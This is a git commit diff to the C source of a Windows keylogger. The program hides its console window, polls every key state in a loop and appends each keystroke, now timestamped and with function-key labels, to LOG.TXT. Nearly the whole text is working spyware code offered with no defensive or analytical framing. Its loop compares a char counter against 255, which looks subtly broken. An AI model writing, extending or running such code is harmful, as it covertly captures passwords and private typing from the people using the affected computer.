65f0db0850abec68f26d9c957e66c1580c2c8f37
yusuf okuducu <k.yusufokuducu@gmail.com>
2024-12-24 02:15:44 +0300

    Timestamp

--- main.c
+++ main.c
@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <windows.h>
+#include <time.h>
 
 void stealth()
 {
@@ -10,11 +11,26 @@ void stealth()
     ShowWindow(stealth, 0);
 }
 
+void logTime(FILE* file)
+{
+    time_t t;
+    struct tm* tm_info;
+    char buffer[26];
+
+    time(&t);
+    tm_info = localtime(&t);
+
+    strftime(buffer, 26, "%Y-%m-%d %H:%M:%S", tm_info);
+    fprintf(file, "[%s] ", buffer);
+}
+
 int save(int keystroke, char* file)
 {
     if ((keystroke == 1) || (keystroke == 2)) return 0;
     FILE* outputFile;
     outputFile = fopen(file, "a+");
+
+    logTime(outputFile);
 
     switch (keystroke) {
     case 8: fprintf(outputFile, "%s", "[BACKSPACE]"); break;
@@ -30,6 +46,19 @@ int save(int keystroke, char* file)
     case VK_UP: fprintf(outputFile, "%s", "[UP]"); break;
     case VK_RIGHT: fprintf(outputFile, "%s", "[RIGHT]"); break;
     case VK_DOWN: fprintf(outputFile, "%s", "[DOWN]"); break;
+    case VK_CAPITAL: fprintf(outputFile, "%s", "[CAPSLOCK]"); break;
+    case VK_F1: fprintf(outputFile, "%s", "[F1]"); break;
+    case VK_F2: fprintf(outputFile, "%s", "[F2]"); break;
+    case VK_F3: fprintf(outputFile, "%s", "[F3]"); break;
+    case VK_F4: fprintf(outputFile, "%s", "[F4]"); break;
+    case VK_F5: fprintf(outputFile, "%s", "[F5]"); break;
+    case VK_F6: fprintf(outputFile, "%s", "[F6]"); break;
+    case VK_F7: fprintf(outputFile, "%s", "[F7]"); break;
+    case VK_F8: fprintf(outputFile, "%s", "[F8]"); break;
+    case VK_F9: fprintf(outputFile, "%s", "[F9]"); break;
+    case VK_F10: fprintf(outputFile, "%s", "[F10]"); break;
+    case VK_F11: fprintf(outputFile, "%s", "[F11]"); break;
+    case VK_F12: fprintf(outputFile, "%s", "[F12]"); break;
     case 190: case 110: fprintf(outputFile, "%s", "."); break;
     default: fprintf(outputFile, "%c", keystroke);
     }
@@ -43,7 +72,7 @@ int main()
     char i;
 
     while (1)
-        for (i = 0; i <= 191; i++)
+        for (i = 0; i <= 255; i++)
             if (GetAsyncKeyState(i) == -32767) save(i, "LOG.TXT");
 
     return 0;
